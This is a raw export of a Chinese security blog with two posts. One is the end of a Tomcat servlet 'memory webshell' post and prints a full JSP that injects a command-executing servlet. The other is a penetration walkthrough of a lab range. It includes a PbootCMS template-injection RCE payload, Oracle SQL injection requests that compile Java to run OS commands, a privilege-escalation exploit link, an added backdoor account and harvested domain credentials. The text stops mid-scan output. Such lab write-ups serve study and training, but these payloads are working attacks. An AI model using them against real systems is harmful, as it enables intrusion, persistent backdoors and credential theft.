class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServlet;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.PrintWriter;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestServlet</span> <span class=\"keyword\">extends</span> <span class=\"title\">HttpServlet</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">doGet</span><span class=\"params\">(HttpServletRequest req, HttpServletResponse resp)</span> <span class=\"keyword\">throws</span> ServletException, IOException </span>&#123;</span><br><span class=\"line\">        resp.setContentType(<span class=\"string\">&quot;text/html&quot;</span>);</span><br><span class=\"line\">        PrintWriter out = resp.getWriter();</span><br><span class=\"line\">        out.println(<span class=\"string\">&quot;&lt;h1&gt;Y0ng&lt;/h1&gt;&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>添加web.xml</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;servlet&gt;</span><br><span class=\"line\">    &lt;servlet-name&gt;test&lt;&#x2F;servlet-name&gt;</span><br><span class=\"line\">    &lt;servlet-class&gt;TestServlet&lt;&#x2F;servlet-class&gt;</span><br><span class=\"line\">&lt;&#x2F;servlet&gt;</span><br><span class=\"line\">&lt;servlet-mapping&gt;</span><br><span class=\"line\">    &lt;servlet-name&gt;test&lt;&#x2F;servlet-name&gt;</span><br><span class=\"line\">    &lt;url-pattern&gt;&#x2F;servlet&lt;&#x2F;url-pattern&gt;</span><br><span class=\"line\">&lt;&#x2F;servlet-mapping&gt;</span><br></pre></td></tr></table></figure>\n\n<p>或者</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">@WebServlet(value &#x3D; &#123;&quot;&#x2F;test&quot;&#125;)</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508132415119.png\" alt=\"image-20220508132415119\"></p>\n<h4 id=\"流程分析-2\"><a href=\"#流程分析-2\" class=\"headerlink\" title=\"流程分析\"></a>流程分析</h4><p><a href=\"https://blog.csdn.net/weixin_34100227/article/details/94527430\">tomcat启动加载Servlet源码浅析_weixin_34100227的博客-CSDN博客_servlet加载</a></p>\n<blockquote>\n<p>所以加载engine这个Container，会递归加载子Container。从engine.start() -&gt; host.start() -&gt; context.start()，context的实现类StandardContext中有一个startInternal方法，它触发了一个init的时候设置的监听器ContextConfig，这个监听器将进行Context的相关配置处理</p>\n</blockquote>\n<p>StandardContext#startInternal()，会触发 ContextConfig#lifecycleEvent(LifecycleEvent event)</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508155103205.png\" alt=\"image-20220508155103205\"></p>\n<p>在ContextConfig中触发的方法为 ContextConfig#lifecycleEvent(LifecycleEvent event)，然后委托给方法 ContextConfig#configureStart() 进行处理</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508144010994.png\" alt=\"image-20220508144010994\"></p>\n<p>ContextConfig#configureStart()中有一个核心方法为ContextConfig#webConfig()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508144159729.png\" alt=\"image-20220508144159729\"></p>\n<p>对web.xml进行解析，放入webXml中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508144637218.png\" alt=\"image-20220508144637218\"></p>\n<p>然后调用 ContextConfig#configureContext(webXml)</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508150710884.png\" alt=\"image-20220508150710884\"></p>\n<p>看看其中对servlet的相关操作，先获取所有的servlet，通过StandardContext#createWrapper()创建一个wrapper</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508151011019.png\" alt=\"image-20220508151011019\"></p>\n<p>接下来是对这个wrapper进行包装相关servlet的信息</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508151905197.png\" alt=\"image-20220508151905197\"></p>\n<p>跟进下这个StandardContext#addChild(wrapper)，判断name是不是jsp，然后调用super.addChild，即ContainerBase#addChild()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508152436848.png\" alt=\"image-20220508152436848\"></p>\n<p>发现又调用了ContainerBase#addChildInternal()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508152934288.png\" alt=\"image-20220508152934288\"></p>\n<p>将child装入到hashmap类型的children中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508153311469.png\" alt=\"image-20220508153311469\"></p>\n<p>调用了LifecycleBase#start()启动组件的生命周期：<a href=\"https://www.jianshu.com/p/2a9ffbd00724\">深入理解Tomcat（二）Lifecycle</a></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508153704979.png\" alt=\"image-20220508153704979\"></p>\n<p>返回到 StandardContext#startInternal()中 loadOnStartup(this.findChildren()) 开始加载servlet</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508160143956.png\" alt=\"image-20220508160143956\"></p>\n<p>ContainerBase#findChildren(),将上面的children(所有的wrapper)放入到容器中，然后返回</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508160329387.png\" alt=\"image-20220508160329387\"></p>\n<p>StandardContext#loadOnStartup()，可以看出遍历所有的wrapper，通过getLoadOnStartup()获得一个数(类似状态码)，如果大于等于0，将其添加到map中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508161242506.png\" alt=\"image-20220508161242506\"></p>\n<p>跟进standardWrapper#getLoadOnStartup()，默认loadOnStartup = -1</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508161919284.png\" alt=\"image-20220508161919284\"></p>\n<p>在servlet的配置当中，**&lt;load-on-startup&gt;1&lt;/load-on-startup&gt;**的含义是：标记容器是否在启动的时候就加载这个servlet<br>当值为0或者大于0时，表示容器在应用启动时就加载这个servlet；<br>当是一个负数时或者没有指定时，则指示容器在该servlet被选择时才加载。</p>\n<p>正数的值越小，启动该servlet的优先级越高</p>\n<p>由于我们要注入内存马，且没有配置xml不会在应用启动时就加载这个servlet，因此需要把优先级调至1，让自己写的servlet直接被加载</p>\n<p>然后就是遍历符合条件的wrapper，通过load()进行加载</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508162614238.png\" alt=\"image-20220508162614238\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508162915068.png\" alt=\"image-20220508162915068\"></p>\n<p>创建了servlet实例</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508163118564.png\" alt=\"image-20220508163118564\"></p>\n<h4 id=\"实现-2\"><a href=\"#实现-2\" class=\"headerlink\" title=\"实现\"></a>实现</h4><p>了解了过程，攻击思路就是：children中存放了很多个child，对应着一个个的wrapper，最后创建了servlet的实例，所以我们需要一个恶意的servlet，并对其进行包装成一个恶意的wrapper，装入到children中，对应的方法就是StandardContext#addChild。</p>\n<figure class=\"highlight\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;&lt;%--</span><br><span class=\"line\">  Created by IntelliJ IDEA.</span><br><span class=\"line\">  User: cys</span><br><span class=\"line\">  Date: <span class=\"number\">2022</span>/<span class=\"number\">5</span>/<span class=\"number\">8</span></span><br><span class=\"line\">  Time: <span class=\"number\">16</span>:<span class=\"number\">59</span></span><br><span class=\"line\">  To change <span class=\"keyword\">this</span> template use File | Settings | File Templates.</span><br><span class=\"line\">--%&gt;</span><br><span class=\"line\">&lt;%@ page contentType=<span class=\"string\">&quot;text/html;charset=UTF-8&quot;</span> language=<span class=\"string\">&quot;java&quot;</span> %&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;%</span><br><span class=\"line\"></span><br><span class=\"line\">  HttpServlet httpServlet = <span class=\"keyword\">new</span> HttpServlet()&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">doGet</span><span class=\"params\">(HttpServletRequest req, HttpServletResponse resp)</span> <span class=\"keyword\">throws</span> ServletException, IOException </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (req.getParameter(<span class=\"string\">&quot;cmd&quot;</span>) != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">boolean</span> isLinux = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">        String osTyp = System.getProperty(<span class=\"string\">&quot;os.name&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (osTyp != <span class=\"keyword\">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class=\"string\">&quot;win&quot;</span>)) &#123;</span><br><span class=\"line\">          isLinux = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        String[] cmds = isLinux ? <span class=\"keyword\">new</span> String[] &#123;<span class=\"string\">&quot;sh&quot;</span>, <span class=\"string\">&quot;-c&quot;</span>, req.getParameter(<span class=\"string\">&quot;cmd&quot;</span>)&#125; : <span class=\"keyword\">new</span> String[] &#123;<span class=\"string\">&quot;cmd.exe&quot;</span>, <span class=\"string\">&quot;/c&quot;</span>, req.getParameter(<span class=\"string\">&quot;cmd&quot;</span>)&#125;;</span><br><span class=\"line\">        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class=\"line\">        Scanner s = <span class=\"keyword\">new</span> Scanner( in ).useDelimiter(<span class=\"string\">&quot;\\\\a&quot;</span>);</span><br><span class=\"line\">        String output = s.hasNext() ? s.next() : <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">        resp.getWriter().write(output);</span><br><span class=\"line\">        resp.getWriter().flush();</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"comment\">//获取context</span></span><br><span class=\"line\">  Field reqF = request.getClass().getDeclaredField(<span class=\"string\">&quot;request&quot;</span>);</span><br><span class=\"line\">  reqF.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">  Request req = (Request) reqF.get(request);</span><br><span class=\"line\">  StandardContext stdcontext = (StandardContext) req.getContext();</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">//创建恶意wrapper</span></span><br><span class=\"line\">  Wrapper wrapper = stdcontext.createWrapper();</span><br><span class=\"line\">  String name = <span class=\"string\">&quot;Y0ng&quot;</span>;</span><br><span class=\"line\">  wrapper.setName(name);</span><br><span class=\"line\">  wrapper.setServlet(httpServlet);</span><br><span class=\"line\">  wrapper.setServletClass(httpServlet.getClass().getName());</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">//将Wrapper添加到StandardContext</span></span><br><span class=\"line\">  stdcontext.addChild(wrapper);</span><br><span class=\"line\">  stdcontext.addServletMappingDecoded(<span class=\"string\">&quot;/Y0ng&quot;</span>, name);</span><br><span class=\"line\">  out.print(<span class=\"string\">&quot;Inject Success !&quot;</span>);</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508172806272.png\" alt=\"image-20220508172806272\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2Fimage-20220508172830181.png\" alt=\"image-20220508172830181\"></p>\n","categories":["JavaSec"]},{"title":"春秋云境-无间计划","url":"/2025/05/31/%E6%97%A0%E9%97%B4%E8%AE%A1%E5%88%92/","content":"<!--more-->\n\n<img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/a4730738967e1a5289810128ac7822ba.png\" style=\"zoom:67%;\" />\n\n<p>大量借鉴了，包括拓扑图片：<a href=\"https://h0ny.github.io/posts/%E6%97%A0%E9%97%B4%E8%AE%A1%E5%88%92-Endless-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/#17226816\">无间计划 Endless - 春秋云境 | h0ny’s blog</a></p>\n<img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/45e3e654a4a7ce43.png\" alt=\"45e3e654a4a7ce43\"/>\n\n<p>网段一：172.23.4.0/24</p>\n<table>\n<thead>\n<tr>\n<th>内网地址</th>\n<th>Host or FQDN</th>\n<th>简要描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>172.23.4.32</td>\n<td>iZ8vba7ky3x2z2y5m70nfaZ</td>\n<td>外网 PbootCMS 服务器</td>\n</tr>\n<tr>\n<td>172.23.4.19</td>\n<td>iZ8vb7ye4lckq0mye86m2mZ</td>\n<td>外网“Search UserInfo”服务器； 使用了内网主机 172.23.4.51 提供的 Oracle 数据库</td>\n</tr>\n<tr>\n<td>172.23.4.51</td>\n<td>WORKGROUP\\IZZN01L0MWMBTPZ</td>\n<td>Oracle 数据库服务器</td>\n</tr>\n<tr>\n<td>172.23.4.12 <strong>172.24.7.16</strong></td>\n<td>IZMN9U6ZO3VTRNZ.pentest.me</td>\n<td>双网卡主机</td>\n</tr>\n</tbody></table>\n<p>网段二：172.24.7.0/24</p>\n<table>\n<thead>\n<tr>\n<th>内网地址</th>\n<th>Host or FQDN</th>\n<th>简要描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>172.24.7.3 <strong>172.25.12.9</strong></td>\n<td>DC.pentest.me</td>\n<td>pentest.me 域控；双网卡主机</td>\n</tr>\n<tr>\n<td>172.24.7.5 <strong>172.25.12.7</strong></td>\n<td>DCadmin.pen.me</td>\n<td>pen.me 域控；双网卡主机</td>\n</tr>\n<tr>\n<td>172.24.7.23</td>\n<td></td>\n<td>gitlab 服务器</td>\n</tr>\n<tr>\n<td>172.24.7.27</td>\n<td></td>\n<td>confluence 服务器</td>\n</tr>\n<tr>\n<td>172.24.7.43 <strong>172.26.8.12</strong></td>\n<td>IZMN9U6ZO3VTRPZ.pentest.me</td>\n<td>双网卡主机</td>\n</tr>\n<tr>\n<td>172.24.7.48</td>\n<td>IZAYSXE6VCUHB4Z.pentest.me</td>\n<td></td>\n</tr>\n</tbody></table>\n<p>网段三：172.25.12.0/24</p>\n<table>\n<thead>\n<tr>\n<th>内网地址</th>\n<th>Host or FQDN</th>\n<th>简要描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>172.25.12.19</td>\n<td>IZ1TUCEKFDPCEMZ.pen.me</td>\n<td>Exchange 邮件服务器</td>\n</tr>\n<tr>\n<td>172.25.12.29</td>\n<td>IZ88QYK8Y8Y3VXZ.pen.me</td>\n<td></td>\n</tr>\n</tbody></table>\n<p>网段四：172.26.8.0/24</p>\n<table>\n<thead>\n<tr>\n<th>内网地址</th>\n<th>Host or FQDN</th>\n<th>简要描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>172.26.8.16</td>\n<td>WORKGROUP\\iZasf84z82mr8tZ</td>\n<td>MSSQL 数据库服务器</td>\n</tr>\n</tbody></table>\n<h1 id=\"pbootcms\"><a href=\"#pbootcms\" class=\"headerlink\" title=\"pbootcms\"></a>pbootcms</h1><p>模板注入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;?a&#x3D;&#125;&#123;pboot&#123;user:password&#125;:if((&quot;sys\\x74em&quot;)(&quot;whoami&quot;));&#x2F;&#x2F;)&#125;xxx&#123;&#x2F;pboot&#123;user:password&#125;:if&#125;</span><br></pre></td></tr></table></figure>\n\n<p>提权：<a href=\"https://github.com/Markakd/CVE-2022-2588\">https://github.com/Markakd/CVE-2022-2588</a></p>\n<p>fscan 扫内网，目前在 172.23.4.0/24 网段</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">172.23.4.51:139 open</span><br><span class=\"line\">172.23.4.51:135 open</span><br><span class=\"line\">172.23.4.12:139 open</span><br><span class=\"line\">172.23.4.12:135 open</span><br><span class=\"line\">172.23.4.19:80 open</span><br><span class=\"line\">172.23.4.32:80 open</span><br><span class=\"line\">172.23.4.32:22 open</span><br><span class=\"line\">172.23.4.19:22 open</span><br><span class=\"line\">172.23.4.51:445 open</span><br><span class=\"line\">172.23.4.12:445 open</span><br><span class=\"line\">172.23.4.51:1521 open</span><br><span class=\"line\">[*] alive ports len is: 11</span><br><span class=\"line\">start vulscan</span><br><span class=\"line\">[*] NetBios 172.23.4.51     WORKGROUP\\IZC5LU1L02AZ0GZ     </span><br><span class=\"line\">[*] NetBios 172.23.4.12     PENTEST\\IZMN9U6ZO3VTRNZ       </span><br><span class=\"line\">[*] NetInfo </span><br><span class=\"line\">[*]172.23.4.51</span><br><span class=\"line\">   [-&gt;]iZc5lu1l02az0gZ</span><br><span class=\"line\">   [-&gt;]172.23.4.51</span><br><span class=\"line\">[*] WebTitle http:&#x2F;&#x2F;172.23.4.19        code:200 len:481    title:Search UserInfo</span><br><span class=\"line\">[*] WebTitle http:&#x2F;&#x2F;172.23.4.32        code:200 len:19779  title:PbootCMS-永久开源免费的PHP企业网站开发建设管理系统</span><br><span class=\"line\">[*] NetInfo </span><br><span class=\"line\">[*]172.23.4.12</span><br><span class=\"line\">   [-&gt;]IZMN9U6ZO3VTRNZ</span><br><span class=\"line\">   [-&gt;]172.23.4.12</span><br><span class=\"line\">   [-&gt;]172.24.7.16</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"oracle注入\"><a href=\"#oracle注入\" class=\"headerlink\" title=\"oracle注入\"></a>oracle注入</h1><p>发现报错oracle，上面也扫出来一台oracle，推测同一台，尝试oracle命令执行</p>\n<p>创建 Java Source</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST &#x2F;login.jsp HTTP&#x2F;1.1</span><br><span class=\"line\">Content-Length: 934</span><br><span class=\"line\">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class=\"line\">Cookie: JSESSIONID&#x3D;A851FFD83CD7562A73788BBFE4665FC1</span><br><span class=\"line\">Connection: keep-alive</span><br><span class=\"line\"></span><br><span class=\"line\">name&#x3D;admin&#39; and (select dbms_xmlquery.newcontext(&#39;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#39;&#39;CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED &quot;CommandExecutor&quot; AS</span><br><span class=\"line\">import java.io.*;</span><br><span class=\"line\">public class CommandExecutor &#123;</span><br><span class=\"line\">    public static String execute(String command)  &#123;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            Process process &#x3D; Runtime.getRuntime().exec(command);</span><br><span class=\"line\">            InputStream inputStream &#x3D; process.getInputStream();</span><br><span class=\"line\">            BufferedReader input &#x3D; new BufferedReader(new InputStreamReader(inputStream, &quot;GBK&quot;));</span><br><span class=\"line\">            String line;</span><br><span class=\"line\">            StringBuilder output &#x3D; new StringBuilder();</span><br><span class=\"line\">            while ((line &#x3D; input.readLine()) !&#x3D; null) &#123;</span><br><span class=\"line\">                output.append(line).append(&quot;\\n&quot;);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            input.close();</span><br><span class=\"line\">            return output.toString();</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; catch (Exception e) &#123;</span><br><span class=\"line\">            return e.toString();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#39;&#39;;commit;end;&#39;) from dual)&gt;1 --</span><br></pre></td></tr></table></figure>\n\n<p>创建用于执行命令的函数（execute_command）：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST &#x2F;login.jsp HTTP&#x2F;1.1</span><br><span class=\"line\">Content-Length: 934</span><br><span class=\"line\">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class=\"line\">Cookie: JSESSIONID&#x3D;A851FFD83CD7562A73788BBFE4665FC1</span><br><span class=\"line\">Connection: keep-alive</span><br><span class=\"line\"></span><br><span class=\"line\">name&#x3D;admin&#39; and (select dbms_xmlquery.newcontext(&#39;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#39;&#39;CREATE OR REPLACE FUNCTION execute_command(command IN VARCHAR2) RETURN VARCHAR2 AS LANGUAGE JAVA NAME &#39;&#39;&#39;&#39;CommandExecutor.execute(java.lang.String) return java.lang.String&#39;&#39;&#39;&#39;; &#39;&#39;;commit;end;&#39;) from dual)&gt;1--</span><br></pre></td></tr></table></figure>\n\n<p>执行命令并回显：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST &#x2F;login.jsp HTTP&#x2F;1.1</span><br><span class=\"line\">Content-Length: 934</span><br><span class=\"line\">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class=\"line\">Cookie: JSESSIONID&#x3D;A851FFD83CD7562A73788BBFE4665FC1</span><br><span class=\"line\">Connection: keep-alive</span><br><span class=\"line\"></span><br><span class=\"line\">name&#x3D;admin&#39; union select null,(select execute_command(&#39;ipconfig&#39;) from dual),null from dual--</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">???? DNS ?? . . . . . . . : </span><br><span class=\"line\">   ??. . . . . . . . . . . . . . . : Red Hat VirtIO Ethernet Adapter #2</span><br><span class=\"line\">   ????. . . . . . . . . . . . . : 00-16-3E-35-96-F8</span><br><span class=\"line\">   DHCP ??? . . . . . . . . . . . : ?</span><br><span class=\"line\">   ???????. . . . . . . . . . : ?</span><br><span class=\"line\">   ???? IPv6 ??. . . . . . . . : fe80::2c2b:35e7:dfae:e556%22(??) </span><br><span class=\"line\">   IPv4 ?? . . . . . . . . . . . . : 172.23.4.51(??) </span><br><span class=\"line\">   ????  . . . . . . . . . . . . : 255.255.0.0</span><br><span class=\"line\">   ???????  . . . . . . . . . : 2025?5?31? 14:41:07</span><br><span class=\"line\">   ???????  . . . . . . . . . : 2085?5?16? 14:41:07</span><br><span class=\"line\">   ????. . . . . . . . . . . . . : 172.23.255.253</span><br><span class=\"line\">   DHCP ??? . . . . . . . . . . . : 172.23.255.253</span><br><span class=\"line\">   DHCPv6 IAID . . . . . . . . . . . : 369104446</span><br><span class=\"line\">   DHCPv6 ??? DUID  . . . . . . . : 00-01-00-01-2B-97-A5-3D-00-16-3E-15-C9-28</span><br><span class=\"line\">   DNS ???  . . . . . . . . . . . : 100.100.2.136</span><br><span class=\"line\">                                       100.100.2.138</span><br><span class=\"line\">   TCPIP ?? NetBIOS  . . . . . . . : ???</span><br></pre></td></tr></table></figure>\n\n<p>添加账号走代理RDP(hack/Abc@123)，收集到域内用户凭证</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">密码记事本</span><br><span class=\"line\">usera@pentest.me</span><br><span class=\"line\">Admin3gv83</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"vlan1-172-23-4-0-24\"><a href=\"#vlan1-172-23-4-0-24\" class=\"headerlink\" title=\"vlan1 172.23.4.0/24\"></a>vlan1 172.23.4.0/24</h1><h2 id=\"入域-172-23-4-12-172-24-7-16\"><a href=\"#入域-172-23-4-12-172-24-7-16\" class=\"headerlink\" title=\"入域 172.23.4.12 - 172.24.7.16\"></a>入域 172.23.4.12 - 172.24.7.16</h2><p>通过上面的凭证，登录唯一的域机器，当前域：pentest.me</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[*] PENTEST\\IZMN9U6ZO3VTRNZ </span><br><span class=\"line\">[*]172.23.4.12</span><br><span class=\"line\">   [-&gt;]IZMN9U6ZO3VTRNZ</span><br><span class=\"line\">   [-&gt;]172.23.4.12</span><br><span class=\"line\">   [-&gt;]172.24.7.16</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Users\\usera\\Desktop&gt;whoami</span><br><span class=\"line\">pentest\\usera</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Users\\usera\\Desktop&gt;ipconfig</span><br><span class=\"line\">Windows IP 配置</span><br><span class=\"line\">以太网适配器 以太网:</span><br><span class=\"line\"></span><br><span class=\"line\">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class=\"line\">   本地链接 IPv6 地址. . . . . . . . : fe80::c9db:9982:d078:eeba%9</span><br><span class=\"line\">   IPv4 地址 . . . . . . . . . . . . : 172.23.4.12</span><br><span class=\"line\">   子网掩码  . . . . . . . . . . . . : 255.255.0.0</span><br><span class=\"line\">   默认网关. . . . . . . . . . . . . : 172.23.255.253</span><br><span class=\"line\"></span><br><span class=\"line\">以太网适配器 以太网 2:</span><br><span class=\"line\"></span><br><span class=\"line\">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class=\"line\">   本地链接 IPv6 地址. . . . . . . . : fe80::b822:7c00:8710:e26e%8</span><br><span class=\"line\">   IPv4 地址 . . . . . . . . . . . . : 172.24.7.16</span><br><span class=\"line\">   子网掩码  . . . . . . . . . . . . : 255.255.0.0</span><br><span class=\"line\">   默认网关. . . . . . . . . . . . . : 172.24.255.253</span><br></pre></td></tr></table></figure>\n\n<p>导出ad信息，做一下信息收集，扫描172.24.7.0/24网段，可以发现又扩展了两个网段 172.25.12.0/24、172.26.8.0/24</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">172.24.7.43:445 open</span><br><span class=\"line\">172.24.7.5:445 open</span><br><span class=\"line\">172.24.7.3:445 open</span><br><span class=\"line\">172.24.7.16:445 open</span><br><span class=\"line\">172.24.7.48:139 open</span><br><span class=\"line\">172.24.7.43:139 open</span><br><span class=\"line\">172.24.7.5:139 open</span><br><span class=\"line\">172.24.7.3:139 open</span><br><span class=\"line\">172.24.7.16:139 open</span><br><span class=\"line\">172.24.7.48:135 open</span><br><span class=\"line\">172.24.7.43:135 open</span><br><span class=\"line\">172.24.7.5:135 open</span><br><span class=\"line\">172.24.7.16:135 open</span><br><span class=\"line\">172.24.7.3:135 open</span><br><span class=\"line\">172.24.7.23:80 open</span><br><span class=\"line\">172.24.7.3:80 open</span><br><span class=\"line\">172.24.7.27:22 open</span><br><span class=\"line\">172.24.7.23:22 open</span><br><span class=\"line\">172.24.7.5:88 open</span><br><span 